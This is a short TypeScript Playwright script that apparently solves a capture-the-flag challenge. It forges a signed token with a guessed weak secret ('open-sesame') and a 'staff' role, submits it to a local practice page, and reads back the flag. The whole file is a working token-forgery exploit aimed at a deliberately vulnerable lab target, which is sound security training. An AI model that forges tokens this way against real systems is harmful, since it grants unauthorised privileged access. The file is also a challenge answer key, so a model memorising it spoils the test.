import type { Page } from "@playwright/test";

export async function solve(page: Page) {
  await page.goto("/targets/05-sesame-weak-secret.html");
  await page.waitForFunction(() =>
    Boolean((window as Window & { sesame?: unknown }).sesame),
  );
  const forged = await page.evaluate(() =>
    (
      window as unknown as Window & {
        sesame: {
          signToken(
            payload: Record<string, string>,
            secret: string,
          ): Promise<string>;
        };
      }
    ).sesame.signToken(
      { sub: "audit-volunteer", role: "staff", iss: "nine-lives" },
      "open-sesame",
    ),
  );
  await page.fill("#token", forged);
  await page.click("#submit");
  await page.waitForFunction(() =>
    document.querySelector("#flag")?.textContent?.includes("ctfpawned{"),
  );
  return page.locator("#flag").textContent();
}
